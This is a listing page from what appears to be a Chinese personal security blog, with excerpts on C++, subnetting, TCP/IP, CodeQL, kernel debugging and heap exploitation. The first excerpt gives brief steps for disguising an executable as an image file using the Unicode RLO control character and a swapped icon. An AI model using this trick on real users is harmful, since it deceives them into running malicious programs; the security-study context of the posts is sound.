简单来说，它是一种编码格式，满足了以前ASCII码无法表示中文、日文等其他语言的缺陷，但是由此引发的安全问题也很多，比如我们今天介绍的Unicode控制符反转伪装后缀名漏洞。
实现方法
替换图标
就是把exe的图标替换成图片的默认图标，或者插入一些羞羞的图片或者QQ图标之类的。
插入控制符
右键选择重命名，删除原文件名，再右键单击，选择“插入Unicode控制符”，选择RLO

构建文件名
需要用两部来制作

gpj.exe
Ascotb

效果如下图

</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2018/12/08/C++TheProblemOfIncomingParameters/" title="c++传入参数的问题"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/36.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="c++传入参数的问题"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/12/08/C++TheProblemOfIncomingParameters/" title="c++传入参数的问题">c++传入参数的问题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-12-08T07:54:07.000Z" title="发表于 2018-12-08 15:54:07">2018-12-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

int tex (int a,int b)
值传递：有一个形参向函数所属的栈拷贝数据的过程，如果值传递的对象是类对象或是大的结构体对象，将耗费一定的时间和空间。
int tex(int *a,int *b)
指针传递：同样有一个形参向函数所属的栈拷贝数据的过程，但拷贝的数据是一个固定为4字节的地址。
int tex(int &amp;a,int &amp;b)
引用传递：同样有上述的数据拷贝过程，但其是针对地址的，相当于为该数据所在的地址起了一个别名。
效率上讲，指针传递和引用传递比值传递效率高。一般主张使用引用传递，代码逻辑上更加紧凑、清晰。
引用传递做函数参数”是C++的特性，C语言不支持。
tip：
如果是值的传递，是拷贝过去的就是在用的函数中修改了那个值也不会影响到原先的值
若果是引用的传递，虽然是数据拷贝但是在用的函数中修改了那个值是会影响到原先的值

</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2018/11/30/SomeAdditionsToTheSubnetMask/" title="子网掩码的一些补充"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/40.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="子网掩码的一些补充"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/11/30/SomeAdditionsToTheSubnetMask/" title="子网掩码的一些补充">子网掩码的一些补充</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-11-30T05:27:53.000Z" title="发表于 2018-11-30 13:27:53">2018-11-30</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/">子网掩码</a></span></div><div class="content">10.0.0.0/8划分为8个子网
因为10.0.0.0/8子网掩码为255.0.0.0  子网的范围从10.0.0.0-10.255.255.255
那么网络位位数增加3位，那么子网掩码为：255.224.0.0，那么：

子网1：即10.0.0.0/11，范围：10.0.0.0-10.31.255.255
子网2：即10.32.0.0/11，范围：10.32.0.0-10.63.255.255
子网3：即10.64.0.0/11，范围：10.64.0.0-10.95.255.255
子网4：即10.96.0.0/11，范围：10.96.0.0-10.127.255.255
子网5：即10.128.0.0/11，范围：10.128.0.0-10.159.255.255
子网6：即10.160.0.0/11，范围：10.160.0.0-10.191.255.255
子网7：即10.192.0.0/11，范围：10.192.0.0-10.223.255.255
子网8：即10.224.0.0/11，范围：10.224.0.0-10.255.255.255
范围IP的头尾分别是网络地址和广 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2018/06/10/StackAndQueueInC++/" title="C++中栈和队列"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/37.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++中栈和队列"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/06/10/StackAndQueueInC++/" title="C++中栈和队列">C++中栈和队列</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-06-10T11:20:25.000Z" title="发表于 2018-06-10 19:20:25">2018-06-10</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%98%9F%E5%88%97/">队列</a></span></div><div class="content">一.解释：
1.栈
栈是一种特殊的线性表。其特殊性在于限定插入和删除数据元素的操作只能在线性表的一端进行。如下所示：

结论：后进先出（Last In First Out），简称为LIFO线性表。
举个例子：你在洗碗把洗好的碗编号为依次摞起来，号在最下面，向上编号依次增加，然后再从上到下把碗放好，这样的话，先被洗的碗，就后被放好。
2.队列
队列(Queue)也是一种运算受限的线性表，它的运算限制与栈不同，是两头都有限制，插入只能在表的一端进行(只进不出)，而删除只能在表的另一端进行(只出不进)，允许删除的一端称为队尾(rear)，允许插入的一端称为队头 (Front),如图所示：

结论：队列的操作原则是先进先出的，所以队列又称作FIFO表(First In First Out)
举个例子：超市付账的时候排队，先来的先排在最前面，后来的后排在队伍最后面，付账时排在队伍前面的先付账，排在后面的后付账。
二.用法
1.头文件
#include&lt;queue&gt;// 队列 #include&lt;stack&gt;//栈
2.定义方式
stack&lt;int&gt;  s;//参 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2017/12/04/NetworkProtocol/" title="TCP/IP"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/38.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="TCP/IP"></a></div><div class="recent-post-info"><a class="article-title" href="/2017/12/04/NetworkProtocol/" title="TCP/IP">TCP/IP</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2017-12-03T20:27:07.000Z" title="发表于 2017-12-04 04:27:07">2017-12-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-17T02:51:02.795Z" title="更新于 2023-07-17 10:51:02">2023-07-17</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/TCP-IP/">TCP/IP</a></span></div><div class="content">在2018/12/15日重构，原转载文章以删除
在2019/1/11日更新
网络协议的分层以及传输流程

关于四层网络协议在Wireshark中对应的位置




OSI中的层
功能
TCP/IP协议族




7 应用层
文件传输，电子邮件，文件服务，虚拟终端
TFTP，HTTP，SNMP，FTP，SMTP，DNS，Telnet 等等


6 表示层
数据格式化，代码转换，数据加密
没有协议


5 会话层
解除或建立与别的接点的联系
没有协议


4 传输层
提供端对端的接口
TCP，UDP


3 网络层
为数据包选择路由
IP，ICMP，OSPF，EIGRP，IGMP，ARP


2 数据链路层
传输有地址的帧以及错误检测功能
SLIP，CSLIP，PPP，MTU


1 物理层
以二进制数据形式在物理媒体上传输数据
ISO2110，IEEE802，IEEE802.2



一个包传输的过程如下图

动图如下

TCP和UDP的区别？
手机的主要功能只有两个–电话和短信，这两种方式的本质差别就是，打电话的时候要先“建立连接”(拨号)，而短信不需要，建立连接需要花费一些时间，但也 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/1022/01/20/WindowsVulnerabilityAnalysis/" title="Windows漏洞分析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/137.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Windows漏洞分析"></a></div><div class="recent-post-info"><a class="article-title" href="/1022/01/20/WindowsVulnerabilityAnalysis/" title="Windows漏洞分析">Windows漏洞分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="1022-01-20T15:40:42.000Z" title="发表于 1022-01-20 23:46:25">1022-01-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Windows/">Windows</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
阿巴阿巴
准备工作

两台机器网络必须联通，并且被调试的机器关闭所有的防火墙
调试的机器需要在Microsoft Store中下载安装WinDbg Preview

配置环境
虚拟机
首先需要在虚拟机中设置串口，如下图

进入需要被调试的机器，创建启动选项卡并且设置开机选择的方式等待时间为10秒（不设置也行，这样设置是为了区分
bcdedit /copy &#123;current&#125; /d &quot;KernelDebug&quot;bcdedit /timeout 10
重启机器进入我们设置好的选项卡

运行如下命令
#关闭强制数字签名bcdedit -set loadoptions DDISABLE_INTEGRITY_CHECKS#开启系统测试模式#关闭时使用bcdedit /set testsigning offbcdedit /set testsigning on#开启调试功能bcdedit /deb ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/1022/01/06/CodeQL/" title="CodeQL学习笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/136.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CodeQL学习笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/1022/01/06/CodeQL/" title="CodeQL学习笔记">CodeQL学习笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="1022-01-06T15:53:53.000Z" title="发表于 1022-01-06 23:59:36">1022-01-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CodeQL/">CodeQL</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

关于搭建就不写了，网上太多了，内容大部分都来着互联网，我只是做个记录，方便自己查询

基本查询结构
为了使用CodeQL进行定制分析，我们可以通过自己编写查询来实现查找漏洞或错误。CodeQL的查询类型有：

告警查询：突出显示代码中特定位置的问题的查询。
路径查询：代码中source和sink之间信息流的查询。

用CodeQL编写的查询文件扩展名为.ql，并包含一个select子句。
import &lt;language&gt; /* 导入对应的语言包 *//* 可能存在的 一些谓词 类的设置 */from /* 声明变量等 */where /* 设置逻辑表达式 */select /* 打印结果 */
CodeQL主要使用逻辑连接词(如and、 or、 not)， 限定词(如forall 、exists)， 还有谓词(predicates)等重要逻辑概念。同时CodeQL也提供了递归的支持和聚合(如count、  ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/1021/07/31/HeapOverflow_Linux_0x02/" title="Linux堆溢出总结（0x02）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/125.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux堆溢出总结（0x02）"></a></div><div class="recent-post-info"><a class="article-title" href="/1021/07/31/HeapOverflow_Linux_0x02/" title="Linux堆溢出总结（0x02）">Linux堆溢出总结（0x02）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="1021-07-31T15:40:42.000Z" title="发表于 1021-07-31 23:46:25">1021-07-31</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%A0%86/">堆</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

缓冲了2个月重新捡起来，有些地方还是没太懂 看来还是二次搁浅了

关于几个知识点
我们在进行堆学习的时候那么就是主要针对的是Linux的动态链接库也就是glibc，但是由于一个系统只存在一个glibc，我们要是进行切换的话会很麻烦，所以下面记几个知识点

libc-database

有一些PWN题故意不给libc文件，但是有泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。
git clone https://github.com/niklasb/libc-databasecd libc-database./get all #下载全部libc文件./get Ubuntu #下载Ubuntu所有libc文件
程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下

glibc-all-in-one

里面有对libc的库，官方文档听清楚的我就不概述了
git clo ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，否则与作者无关，如果您不同意请关闭本站<img src= "/img/loading.gif" data-lazy-src="/img/announcement2.gif" style="zoom:25%;" ></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数与梯度"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/169.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="方向导数与梯度"/></a><div class="content"><a class="title" href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数与梯度">方向导数与梯度</a><time datetime="2023-07-25T15:58:53.000Z" title="发表于 2023-07-25 23:58:53">2023-07-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/168.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元函数微分的几何应用"/></a><div class="content"><a class="title" href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用">多元函数微分的几何应用</a><time datetime="2023-07-03T15:58:53.000Z" title="发表于 2023-07-03 23:58:53">2023-07-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/167.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="隐函数求导"/></a><div class="content"><a class="title" href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导">隐函数求导</a><time datetime="2023-06-24T15:58:53.000Z" title="发表于 2023-06-24 23:58:53">2023-06-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/18/FurtherMathematics_0xD/" title="多元复合函数求导法则"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/166.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元复合函数求导法则"/></a><div class="content"><a class="title" href="/2023/06/18/FurtherMathematics_0xD/" title="多元复合函数求导法则">多元复合函数求导法则</a><time datetime="2023-06-18T15:58:53.000Z" title="发表于 2023-06-18 23:58:53">2023-06-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/11/FurtherMathematics_0xC/" title="偏导数与全微分"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/165.png" onerror="this.onerror=null;this.src='/img/404.gif'" alt="偏导数与全微分"/></a><div class="content"><a class="title" href="/2023/06/11/FurtherMathematics_0xC/" title="偏导数与全微分">偏导数与全微分</a><time datetime="2023-06-11T15:58:53.000Z" title="发表于 2023-06-11 23:58:53">2023-06-11</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/C-%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">C++笔记</span><span class="card-category-list-count">8</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CodeQL/"><span class="card-category-list-name">CodeQL</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Docker%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Docker笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/GDB%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">GDB笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Golang%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Golang笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Linux%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Linux笔记</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Windows%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Windows笔记</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/XSS/"><span class="card-category-list-name">XSS</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/BadUSB/" style="font-size: 1.15em; color: rgb(72, 184, 22)">BadUSB</a><a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 1.19em; color: rgb(143, 59, 122)">钓鱼</a><a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 1.32em; color: rgb(124, 148, 58)">免杀</a><a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 1.28em; color: rgb(181, 159, 176)">木马</a><a href="/tags/%E7%97%85%E6%AF%92/" style="font-size: 1.19em; color: rgb(77, 189, 3)">病毒</a><a href="/tags/Metasploit/" style="font-size: 1.15em; color: rgb(31, 182, 59)">Metasploit</a><a href="/tags/CobaltStrike/" style="font-size: 1.19em; color: rgb(74, 106, 143)">CobaltStrike</a><a href="/tags/%E7%BB%95%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 1.15em; color: rgb(133, 177, 97)">绕虚拟机</a><a href="/tags/C/" style="font-size: 1.36em; color: rgb(148, 165, 200)">C++</a><a href="/tags/%E6%AD%A3%E5%88%99/" style="font-size: 1.15em; color: rgb(10, 135, 197)">正则</a><a href="/tags/C-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/" style="font-size: 1.15em; color: rgb(158, 153, 178)">C++命名规范</a><a href="/tags/CSGO/" style="font-size: 1.41em; color: rgb(86, 103, 22)">CSGO</a><a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 1.41em; color: rgb(145, 168, 189)">破解</a><a href="/tags/%E5%A4%96%E6%8C%82/" style="font-size: 1.41em; color: rgb(111, 68, 151)">外挂</a><a href="/tags/CodeQL/" style="font-size: 1.15em; color: rgb(35, 50, 9)">CodeQL</a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.15em; color: rgb(142, 116, 29)">数据库</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.15em; color: rgb(169, 12, 71)">SQL注入</a><a href="/tags/XSS/" style="font-size: 1.19em; color: rgb(18, 19, 120)">XSS</a><a href="/tags/Docker/" style="font-size: 1.15em; color: rgb(21, 172, 117)">Docker</a><a href="/tags/ELF/" style="font-size: 1.15em; color: rgb(13, 70, 158)">ELF</a><a href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/" style="font-size: 1.15em; color: rgb(29, 152, 142)">无人机</a><a href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA%E9%85%8D%E4%BB%B6/" style="font-size: 1.15em; color: rgb(129, 194, 150)">无人机配件</a><a href="/tags/%E9%AB%98%E6%95%B0/" style="font-size: 1.45em; color: rgb(124, 1, 28)">高数</a><a href="/tags/DLL%E5%8A%AB%E6%8C%81/" style="font-size: 1.15em; color: rgb(94, 0, 177)">DLL劫持</a><a href="/tags/%E5%8E%BB%E9%99%A4%E7%89%B9%E5%BE%81/" style="font-size: 1.15em; color: rgb(4, 190, 64)">去除特征</a><a href="/tags/GDB/" style="font-size: 1.15em; color: rgb(100, 130, 195)">GDB</a><a href="/tags/Golang/" style="font-size: 1.15em; color: rgb(51, 20, 160)">Golang</a><a href="/tags/%E5%A0%86/" style="font-size: 1.24em; color: rgb(84, 26, 28)">堆</a><a href="/tags/%E6%BA%A2%E5%87%BA/" style="font-size: 1.32em; color: rgb(187, 113, 32)">溢出</a><a href="/tags/%E7%A1%AC%E4%BB%B6/" style="font-size: 1.15em; color: rgb(7, 18, 178)">硬件</a><a href="/tags/%E6%A0%88/" style="font-size: 1.32em; color: rgb(80, 116, 135)">栈</a><a href="/tags/%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/" style="font-size: 1.15em; color: rgb(193, 195, 165)">内存结构</a><a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 1.24em; color: rgb(52, 160, 186)">信息收集</a><a href="/tags/java%E7%8E%AF%E5%A2%83/" style="font-size: 1.15em; color: rgb(5, 178, 189)">java环境</a><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 1.15em; color: rgb(162, 63, 79)">应急响应</a><a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 1.15em; color: rgb(134, 193, 122)">抓包</a><a href="/tags/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/" style="font-size: 1.15em; color: rgb(140, 73, 142)">双向认证</a><a href="/tags/%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81/" style="font-size: 1.15em; color: rgb(27, 152, 35)">单向认证</a><a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 1.36em; color: rgb(46, 59, 64)">红蓝对抗</a><a href="/tags/Meterpreter/" style="font-size: 1.15em; color: rgb(31, 14, 73)">Meterpreter</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">2023年07月</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">2023年06月</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">2023年05月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">2023年04月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">2023年03月</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/02/"><span class="card-archive-list-date">2023年02月</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">2022年12月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/10/"><span class="card-archive-list-date">2022年10月</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">82</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2017-08-08T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">229.5k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-08-29T01:57:13.863Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://raw.githubusercontent.com/Ascotbe/Image/master/Blog/1.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By ascotbe</div><div class="footer_custom_text">Hi, welcome to my <a href="https://www.ascotbe.com/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["我们都是阴沟里的虫子&#44;但总还是得有人仰望星空","We are all in the gutter&#44;but there is still looking at the stars."],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = '我们都是阴沟里的虫子&#44;但总还是得有人仰望星空'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
